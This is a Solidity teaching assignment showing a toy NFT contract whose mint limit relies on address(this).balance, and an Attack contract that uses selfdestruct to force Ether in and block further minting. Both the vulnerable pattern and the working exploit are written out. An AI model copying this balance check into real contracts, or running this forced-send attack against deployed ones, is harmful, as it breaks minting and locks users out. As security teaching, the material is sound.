// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
//Assignment: Write a code to hack a contract using self destruct
//Tech4dev just created its own NFT and allowing public, beneficiaries and collaborators to mint it 


contract Tech4devNFT{

//Limit the amount of minted NFTs by setting a goal to 200 Ether and keep track of the goal
uint public targetAmount = 200 ether; 

uint public totalSupply; //create state variable to keep track of the total supply 
mapping(uint => address) public ownerOf; //map the id of the NFT and the address of person who minted

    
    function mintNFT() public payable{ //mint function that allows to pay Ether 
require(msg.value == 1 ether, "Denied, you can only send 1 Ether"); //require that the person sends the right amount

//require the balance of this smart contract less than or equal to the goal, otherwise people cannot mint more NFT 
require(address(this).balance <= targetAmount, "Minting has terminated");

    totalSupply+= 1; //increment the total supply after each purchase to track the IDs

    ownerOf[totalSupply] = msg.sender; ///declare the ownership of the person who minted
    }

}


//the vulnerability is on line 18 which is the misuse of (this).balance to keep track of the balance
//to keep track if the goal was reached or not, based on the balance of the main contract
//the attacker can take advantage of this code defect by using the self-destruct function 

contract Attack{

//create a state variable replicating the main contract that will enable the contract attack to communicate with it 
    Tech4devNFT tech4devnft; 

    constructor(Tech4devNFT _tech4devnft) { //constructor  that takes in the address of contract to be attacked 
    tech4devnft = Tech4devNFT(_tech4devnft); //initialise the address of the main contract
    }

//in order to attack, the attacker can break the contract by participating and sending Ether

    function attack() external payable {//function attack that enables the attacker to send Ether 
    address payable T4DnftAddr = payable(address(tech4devnft));//cast the NFT address to make it a payable type
    selfdestruct(T4DnftAddr); //call selfdestruct function to destroy the main contract (with address is to be attacked)
    //this function will force to send all Ether contained in the smart contract 

    }

}